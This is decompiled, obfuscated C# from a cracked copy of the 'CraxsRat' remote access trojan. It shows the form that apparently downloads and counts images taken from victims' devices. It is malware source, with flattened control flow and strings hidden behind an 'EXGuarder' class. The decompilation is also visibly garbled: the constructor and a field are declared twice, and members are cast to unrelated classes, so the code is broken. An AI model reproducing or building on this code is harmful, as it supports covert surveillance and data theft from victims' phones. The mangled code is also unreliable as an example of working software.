// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.snapsdownloader
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class snapsdownloader : Form
  {
    private IContainer components;
    public string tipid;
    public Bitmap tippic;
    private IContainer components;

    internal virtual DrakeUIProcessBar Bbar
    {
      get => ((tipfirewalltracker) this)._Bbar;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((tipfirewalltracker) this)._Bbar = value;
    }

    internal virtual Panel Panel1
    {
      get => ((tipfirewalltracker) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._Panel1 = value;
      }
    }

    internal virtual Label infotext
    {
      get => ((tipfirewalltracker) this)._infotext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._infotext = value;
      }
    }

    internal virtual PictureBox clipic
    {
      get => ((tipfirewalltracker) this)._clipic;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._clipic = value;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon12
    {
      get => ((tipfirewalltracker) this)._DrakeUIButtonIcon12;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon12_Click);
label_1:
        int num1 = -618764758;
        DrakeUIButtonIcon drakeUiButtonIcon12;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-(~num1 ^ ~~-(-1781444019 * 1970079127)) - 1768787282 + (1269930878 - -1377500366)) * 572099413)) % 7U)
          {
            case 0:
              drakeUiButtonIcon12.Click += eventHandler;
              num1 = (int) num2 * -118554894 ^ -1313302093;
              continue;
            case 1:
              goto label_3;
            case 2:
              ((tipfirewalltracker) this)._DrakeUIButtonIcon12 = value;
              drakeUiButtonIcon12 = ((tipfirewalltracker) this)._DrakeUIButtonIcon12;
              int num3;
              num1 = num3 = drakeUiButtonIcon12 == null ? 2052272103 : (num3 = 1994023554);
              continue;
            case 3:
              goto label_1;
            case 4:
              drakeUiButtonIcon12 = ((tipfirewalltracker) this)._DrakeUIButtonIcon12;
              num1 = (int) num2 * 1100233890 ^ 1839694457;
              continue;
            case 5:
              drakeUiButtonIcon12.Click -= eventHandler;
              num1 = (int) num2 * 764083494 ^ 178974732;
              continue;
            case 6:
              int num4 = drakeUiButtonIcon12 == null ? -1507836658 : (num4 = 2110946099);
              num1 = num4 ^ (int) num2 * 654150748;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
    {
      get => ((tipfirewalltracker) this)._DrakeUIButtonIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
        DrakeUIButtonIcon drakeUiButtonIcon1 = ((tipfirewalltracker) this)._DrakeUIButtonIcon1;
label_1:
        int num1 = -765818478;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -((~(-370864461 * 1188480067) + -((-1891518989 ^ -1568238424) + ~1673997814) + (--1830570186 ^ 1179187209 * 794921141 ^ --1991261608 ^ -855758800) - num2 - -(-(1953796722 - 175006486) ^ (373255676 ^ -1475150185) + (-1123111149 - 1410186250))) * -1897337923 ^ 1017937687 * 211545123 + (1308224559 - 253782574))) % 6U)
          {
            case 0:
              drakeUiButtonIcon1.Click -= eventHandler;
              num1 = (int) num3 * 584907025 ^ -1419920494;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              int num4 = drakeUiButtonIcon1 == null ? -1420445170 : (num4 = -1874850065);
              num1 = num4 ^ (int) num3 * 1173389414;
              continue;
            case 4:
              drakeUiButtonIcon1.Click += eventHandler;
              num1 = (int) num3 * -888608962 ^ -716656496;
              continue;
            case 5:
              ((tipfirewalltracker) this)._DrakeUIButtonIcon1 = value;
              drakeUiButtonIcon1 = ((tipfirewalltracker) this)._DrakeUIButtonIcon1;
              int num5;
              num1 = num5 = drakeUiButtonIcon1 == null ? -270788696 : (num5 = 2119550687);
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Label lefttext
    {
      get => ((tipfirewalltracker) this)._lefttext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._lefttext = value;
      }
    }

    internal virtual Label finishedtext
    {
      get => ((tipfirewalltracker) this)._finishedtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._finishedtext = value;
      }
    }

    internal virtual Label totaltext
    {
      get => ((tipfirewalltracker) this)._totaltext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._totaltext = value;
      }
    }

    internal virtual Label statustext
    {
      get => ((tipfirewalltracker) this)._statustext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._statustext = value;
      }
    }

    internal virtual Label Label1
    {
      get => ((tipfirewalltracker) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((tipfirewalltracker) this)._Label1 = value;
      }
    }

    public snapsdownloader()
    {
      this.Load += new EventHandler(this.Snapsdownloader_Load);
      ((AccountManager) this).imageCounter = 0;
      ((AccountManager) this).totalImages = 0;
      ((AccountManager) this).Downloadfolder = EXGuarder.\u0036A363B61;
      ((smsMaker) this).InitializeComponent();
    }

    private void Snapsdownloader_Load(object sender, EventArgs e)
    {
      this.Visible = true;
label_1:
      int num1 = -1920672557;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(~(num1 * -2032751905 - (219433007 - (668066418 - 1378339503 - (-1266813303 ^ -1509894222)) * -1773564587)) + (508194178 * 1303894985 - 644378659 * 804252631))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
            int x = checked (workingArea.Width - this.Width);
            workingArea = Screen.PrimaryScreen.WorkingArea;
            int y = checked (workingArea.Height - this.Height);
            this.Location = new Point(x, y);
            num1 = (int) num2 * 2110736897 ^ -569481493;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public void UpdateProgressBar()
    {
      if (!this.InvokeRequired)
        goto label_9;
label_1:
      int num1 = 1596580088;
label_2:
      int num2;
      while (true)
      {
        int num3 = num1;
        uint num4;
        switch ((num4 = (uint) ((--(-~~~1291216701 - num3) - 1379392515 * ~1977483422) * 744929719 ^ -1084436482)) % 10U)
        {
          case 0:
            num1 = (int) num4 * -1420334938 ^ -332269516;
            continue;
          case 1:
            goto label_3;
          case 2:
            this.Bbar.Value = num2;
            num1 = (int) num4 * -1565746798 ^ -1486838515;
            continue;
          case 3:
            goto label_9;
          case 4:
            this.finishedtext.Text = EXGuarder.\u0037473623E + ((AccountManager) this).imageCounter.ToString();
            this.lefttext.Text = EXGuarder.\u00303495D78 + checked (((AccountManager) this).totalImages - ((AccountManager) this).imageCounter).ToString();
            int num5 = this.Bbar.Value != this.Bbar.Maximum ? 1555105439 : (num5 = -587735883);
            num1 = num5 ^ (int) num4 * 1836397262;
            continue;
          case 5:
            num1 = (int) num4 * -188560216 ^ -1585893576;
            continue;
          case 6:
            this.statustext.Text = EXGuarder.\u0036630634B;
            num1 = -1603679296;
            continue;
          case 7:
            goto label_1;
          case 8:
            this.statustext.Text = EXGuarder.\u00378454755;
            num1 = (int) num4 * -1107383652 ^ 43136448;
            continue;
          case 9:
            // ISSUE: method pointer
            this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__52\u002D0)));
            num1 = (int) num4 * -261452859 ^ 419850268;
            continue;
          default:
            goto label_12;
        }
      }
label_3:
      return;
label_12:
      return;
label_9:
      num2 = checked ((int) Math.Round(unchecked ((double) ((AccountManager) this).imageCounter / (double) ((AccountManager) this).totalImages * 100.0)));
      num1 = -805802707;
      goto label_2;
    }

    private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
    {
      if (this.Bbar.Value == this.Bbar.Maximum)
        goto label_5;
label_1:
      int num1 = 1505385430;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(-(((num1 ^ -(1074809772 ^ 69072627 - 1251206840 ^ -432380431) ^ 852750196 - (-~-1774228533 ^ 1113295231 * ~1449499234)) + (--809398137 + 1864838959)) * -1155431873) - (-101628931 ^ 476970332))) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            goto label_3;
          case 3:
            int num3 = !Codes.MyMsgBox(EXGuarder.\u003661E5F69, EXGuarder.\u003595D123D, true, Craxs_Rat.My.Resources.Resources.information48px) ? 1594172237 : (num3 = -358125264);
            num1 = num3 ^ (int) num2 * 1488116520;
            continue;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.Close();
      num1 = -1025288427;
      goto label_2;
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (!Directory.Exists(((AccountManager) this).Downloadfolder))
        return;
label_1:
      int num1 = -124138161;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~~((-65094099 ^ 412043067) - ~(num2 - ~~-(53632838 - 676285423 ^ 494768757 - 1157515110)) * 812962435)) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            Process.Start(((AccountManager) this).Downloadfolder);
            num1 = (int) num3 * 1545315921 ^ -391251895;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    public snapsdownloader()
    {
label_1:
      int num1 = 1534601553;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~(601538160 - -((num2 - -((1584022895 ^ 89531731 ^ -887554200) + 2113900851 + (-1312219888 ^ -67110085) * 2037424355 * -719335281)) * 671567083) ^ -1866353127 - 1763086574)) % 8U)
        {
          case 0:
            ((AccountManager) this).ARtipFW = EXGuarder.\u00361067975;
            ((AccountManager) this).ARtipTR = EXGuarder.\u00340343816;
            num1 = (int) num3 * 479970219 ^ -1514784603;
            continue;
          case 1:
            this.Load += new EventHandler(((tipfirewalltracker) this).Tipfirewalltracker_Load);
            num1 = (int) num3 * -1815809220 ^ -35387409;
            continue;
          case 3:
            ((AccountManager) this).ENtipFW = EXGuarder.\u003610C0A02;
            // ISSUE: reference to a compiler-generated field
            ((AccountManager._Closure\u0024__) this).CNtipTR = EXGuarder.\u0035A051E6C;
            // ISSUE: reference to a compiler-generated field
            ((AccountManager._Closure\u0024__) this).CNtipFW = EXGuarder.\u0035F045C6E;
            num1 = (int) num3 * 492847273 ^ 233175327;
            continue;
          case 4:
            ((AccountManager) this).FirstTipCN = EXGuarder.\u0036D59680B;
            num1 = (int) num3 * -1560441975 ^ 576076314;
            continue;
          case 5:
            ((AccountManager) this).ENtipTR = EXGuarder.\u0031A792A75;
            num1 = (int) num3 * -1147584528 ^ 1894829759;
            continue;
          case 6:
            goto label_1;
          case 7:
            ((AccountManager) this).FirstTipEN = EXGuarder.\u00348097705;
            ((AccountManager) this).FirstTipAR = EXGuarder.\u0032A451023;
            num1 = (int) num3 * -2060719353 ^ -871499021;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      ((tipfirewalltracker) this).InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 1680783657;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((-~~num1 ^ -459531195 * 1796633250 ^ ~-998773185) + 815892608)) % 4U)
          {
            case 0:
              ((AccountManager) this).components.Dispose();
              num1 = (int) num2 * -9886914 ^ 1728049171;
              continue;
            case 1:
              int num3 = ((AccountManager) this).components == null ? -923887713 : (num3 = -1270133218);
              num1 = num3 ^ (int) num2 * -1846968844;
              continue;
            case 2:
              goto label_1;
            case 3:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }
  }
}
